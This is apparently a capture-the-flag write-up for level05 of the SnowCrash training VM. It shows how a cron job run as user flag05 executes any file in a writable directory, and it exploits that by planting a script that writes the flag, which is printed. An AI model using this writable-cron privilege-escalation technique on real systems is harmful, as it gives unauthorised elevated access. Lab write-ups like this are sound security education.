### Exploit

Immediately after connecting into `level05`, we're welcomed with:
```
	level05@172.20.10.3's password:
	You have new mail.
```
Cool, I wonder who this might be... This is a decisive clue, as we now know the exploit's got something to do with crontab. 
Let's check our new email.

```
	level05@SnowCrash:/var/mail$ cat level05
	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
The email says a task executing `openarenaserver` is called every two minutes by user `flag05`. Now, what does this binary file do exactly?

```
	level05@SnowCrash:/usr/sbin$ cat openarenaserver
	#!/bin/sh

	for i in /opt/openarenaserver/* ; do
		(ulimit -t 5; bash -x "$i")
		rm -f "$i"
	done
```
Roughly speaking, this script will execute every file found in the given path `/opt/openarenaserver/` every two minutes. Said file is deleted after execution. This is great news, as we've got writing rights on this repository and our script will be executed under the pretence of user `flag05`. Because `flag05`'s got execution rights on the command `getflag`, this is what the exploit should look like.

```  
	level05@SnowCrash:/opt/openarenaserver$ echo "getflag >> /tmp/flag05" >> script
	level05@SnowCrash:/opt/openarenaserver$ cat script
	getflag >> /tmp/flag05
	level05@SnowCrash:/opt/openarenaserver$ ls
	script
	level05@SnowCrash:/opt/openarenaserver$ ls
	level05@SnowCrash:/opt/openarenaserver$ cat /tmp/flag05
	Check flag.Here is your token : viuaaale9huek52boumoomioc
 ```
 
 Nice work! 
 
